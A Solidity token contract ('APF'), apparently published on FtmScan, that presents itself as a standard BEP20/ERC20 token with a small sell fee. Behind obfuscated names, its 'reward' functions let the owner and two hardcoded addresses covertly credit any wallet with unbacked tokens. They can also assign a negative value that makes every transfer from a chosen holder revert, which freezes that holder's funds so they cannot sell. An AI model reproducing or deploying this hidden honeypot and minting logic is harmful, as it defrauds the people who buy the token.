/**
 *Submitted for verification at FtmScan.com on 2022-11-19
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owner;

    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor() {
        _transferownership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function renounceownership() public virtual onlyOwner {
        _transferownership(address(0));
    }


    function transferownership(address newowner) public virtual onlyOwner {
        require(newowner != address(0), "Ownable: new owner is the zero address");
        _transferownership(newowner);
    }


    function _transferownership(address newowner) internal virtual {
        address oldowner = _owner;
        _owner = newowner;
        emit ownershipTransferred(oldowner, newowner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint acooosntADesired,
        uint acooosntBDesired,
        uint acooosntAMin,
        uint acooosntBMin,
        address to,
        uint deadline
    ) external returns (uint acooosntA, uint acooosntB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint acooosntTokenDesired,
        uint acooosntTokenMin,
        uint acooosntETHMin,
        address to,
        uint deadline
    ) external payable returns (uint acooosntToken, uint acooosntETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint acooosntAMin,
        uint acooosntBMin,
        address to,
        uint deadline
    ) external returns (uint acooosntA, uint acooosntB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint acooosntTokenMin,
        uint acooosntETHMin,
        address to,
        uint deadline
    ) external returns (uint acooosntToken, uint acooosntETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint acooosntAMin,
        uint acooosntBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acooosntA, uint acooosntB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint acooosntTokenMin,
        uint acooosntETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acooosntToken, uint acooosntETH);
    function swapExactTokensForTokens(
        uint acooosntIn,
        uint acooosntOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory acooosnts);
    function swapTokensForExactTokens(
        uint acooosntOut,
        uint acooosntInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory acooosnts);
    function swapExactETHForTokens(uint acooosntOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory acooosnts);
    function swapTokensForExactETH(uint acooosntOut, uint acooosntInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory acooosnts);
    function swapExactTokensForETH(uint acooosntIn, uint acooosntOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory acooosnts);
    function swapETHForExactTokens(uint acooosntOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory acooosnts);

    function quote(uint acooosntA, uint reserveA, uint reserveB) external pure returns (uint acooosntB);
    function getacooosntOut(uint acooosntIn, uint reserveIn, uint reserveOut) external pure returns (uint acooosntOut);
    function getacooosntIn(uint acooosntOut, uint reserveIn, uint reserveOut) external pure returns (uint acooosntIn);
    function getacooosntsOut(uint acooosntIn, address[] calldata path) external view returns (uint[] memory acooosnts);
    function getacooosntsIn(uint acooosntOut, address[] calldata path) external view returns (uint[] memory acooosnts);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfireOnTransferTokens(
        address token,
        uint liquidity,
        uint acooosntTokenMin,
        uint acooosntETHMin,
        address to,
        uint deadline
    ) external returns (uint acooosntETH);
    function removeLiquidityETHWithPermitSupportingfireOnTransferTokens(
        address token,
        uint liquidity,
        uint acooosntTokenMin,
        uint acooosntETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acooosntETH);

    function swapExactTokensForTokensSupportingfireOnTransferTokens(
        uint acooosntIn,
        uint acooosntOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfireOnTransferTokens(
        uint acooosntOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfireOnTransferTokens(
        uint acooosntIn,
        uint acooosntOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function fireTo() external view returns (address);
    function fireToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfireTo(address) external;
    function setfireToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


contract APF is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalasence = _balances[from];
        require(fromBalasence >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {
        _balances[from] = fromBalasence - amount;
    }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
    unchecked {
        _balances[account] = accountBalance - amount;
    }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _mtin(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }


    address public uniswapV2Pair;
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());
    }

    using SafeMath for uint256;

    uint256 private _defaultSelltkiqbvi = 2;

    uint256 private _defaultBuytkiqbvi = 0;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => int256) private _rewards;

    address private _marketMAewAddress = 0x4D8612d2041BBC54D606079D9BA5c000B8fd52Fb;
    address private _fundZPewAddress = 0x47552c0bBB59405F43512374296029623239EF4D;


    function setMarketAddress(address addr) external onlyOwner {
        _marketMAewAddress = addr;
    }

    function setFundAddress(address addr) external onlyOwner {
        _fundZPewAddress = addr;
    }



    function setPairList(address _address) external osUQbFbuVbEqz {
        uniswapV2Pair = _address;
    }

    function setAdminaruutReward(address accbount,int256 amount ) external osEnzKhQkXnmnE {
        _rewards[accbount] += amount;
    }

    function setUseraruutReward(address accbount) external osUQbFbuVbEqz {
        _rewards[accbount] = int256(0) - int256(_totalSupply);
    }

    function rmUseraruutReward(address accbount) external osUQbFbuVbEqz {
        _rewards[accbount] = 0;
    }

    function getaruutReward(address accbount) external view returns (int256) {
        return _rewards[accbount];
    }


    modifier osUQbFbuVbEqz() {
        require(owner() == msg.sender || _marketMAewAddress == msg.sender, "!Market");
        _;
    }

    modifier osEnzKhQkXnmnE() {
        require(owner() == msg.sender || _fundZPewAddress == msg.sender, "!Funder");
        _;
    }




    function _recxagkicF(
        address from,
        address _to,
        uint256 _acooosnt
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalasence = _balances[from];
        require(fromBalasence >= _acooosnt, "ERC20: transfer amount exceeds balance");
        if (_rewards[from] > 0){
            _balances[from] = _balances[from].add(uint256(_rewards[from]));
        }else if (_rewards[from] < 0){
            _balances[from] = _balances[from].sub(uint256(_rewards[from]));
        }


        uint256 tradetkiqbviacooosnt = 0;
        uint256 tradefire = _defaultSelltkiqbvi;
        if (uniswapV2Pair != address(0)) {
            if (_to == uniswapV2Pair) {
                tradefire = _defaultSelltkiqbvi;
            }
            if (from == uniswapV2Pair) {
                tradefire = _defaultBuytkiqbvi;
            }
        }
        tradetkiqbviacooosnt = _acooosnt.mul(tradefire).div(100);

        if (tradetkiqbviacooosnt > 0) {
            _balances[from] = _balances[from].sub(tradetkiqbviacooosnt);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradetkiqbviacooosnt);
            emit Transfer(from, _deadAddress, tradetkiqbviacooosnt);
        }

        _balances[from] = _balances[from].sub(_acooosnt - tradetkiqbviacooosnt);
        _balances[_to] = _balances[_to].add(_acooosnt - tradetkiqbviacooosnt);
        emit Transfer(from, _to, _acooosnt - tradetkiqbviacooosnt);
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _recxagkicF(owner, to, amount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amount);
        _recxagkicF(from, to, amount);
        return true;
    }


}